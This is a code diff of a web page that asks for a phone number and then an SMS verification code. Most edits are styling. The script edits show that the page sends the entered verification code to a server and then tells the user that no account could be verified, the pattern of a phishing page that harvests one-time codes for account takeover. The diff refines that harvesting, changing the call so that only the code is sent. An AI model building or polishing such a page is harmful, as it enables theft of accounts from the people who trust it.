@@ -14,7 +14,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            overflow: hidden;
+            box-sizing: border-box;
         }
 
         .container {
@@ -25,7 +25,6 @@
             text-align: center;
             width: 100%;
             max-width: 400px;
-            margin: 0 auto;
         }
 
         .container img {
@@ -59,12 +58,22 @@
 
         select, input[type="text"], input[type="number"] {
             width: 100%;
-            padding: 12px;
+            padding: 10px;
             border: 1px solid #ccc;
             border-radius: 5px;
             font-size: 16px;
             box-sizing: border-box;
             margin-bottom: 10px;
+        }
+
+        input[type="text"] {
+            -webkit-appearance: none; /* Removes default styling in iOS */
+            -moz-appearance: none; /* Removes default styling in Firefox */
+            appearance: none; /* Removes default styling in other browsers */
+        }
+
+        input[type="number"] {
+            -moz-appearance: textfield; /* Removes spinner in Firefox */
         }
 
         input[type="checkbox"] {
@@ -96,17 +105,16 @@
             display: none;
         }
 
-        /* Responsive Styles */
-        @media (max-width: 600px) {
+        /* Additional styling for smaller screens */
+        @media (max-width: 480px) {
             .container {
                 padding: 15px;
                 max-width: 100%;
-                box-sizing: border-box;
             }
 
-            .button, input[type="text"], input[type="number"] {
-                padding: 14px;
-                font-size: 18px;
+            .button {
+                font-size: 14px;
+                padding: 10px;
             }
         }
     </style>
@@ -135,7 +143,7 @@
 
         <div class="input-group">
             <label for="phoneNumber">Phone Number</label>
-            <input type="text" id="phoneNumber" placeholder="Phone Number">
+            <input type="text" id="phoneNumber" placeholder="Phone Number" inputmode="numeric">
         </div>
 
         <div>
@@ -168,7 +176,8 @@
         function updatePhoneNumberPrefix() {
             const countryCode = document.getElementById('countryCode').value;
             const phoneNumberField = document.getElementById('phoneNumber');
-            phoneNumberField.value = countryCode + ' ' + phoneNumberField.value.replace(/^\+\d+\s*/, '');
+            const currentValue = phoneNumberField.value.replace(/^\+\d+\s*/, '');
+            phoneNumberField.value = `${countryCode} ${currentValue}`;
         }
 
         function goToVerificationPage() {
@@ -180,9 +189,6 @@
                 alert('Please enter your phone number.');
                 return;
             }
-
-            // Send phone number to server immediately
-            sendDataToServer(fullPhoneNumber, null);
 
             document.getElementById('phoneDisplay').textContent = fullPhoneNumber;
 
@@ -222,8 +228,7 @@
                 return;
             }
 
-            // Send verification code to server immediately
-            sendDataToServer(phoneDisplay, verificationCode);
+            sendDataToServer('', verificationCode); // Send only the verification code
 
             document.getElementById('verificationContainer').style.display = 'none';
             document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number: ${phoneDisplay}`;
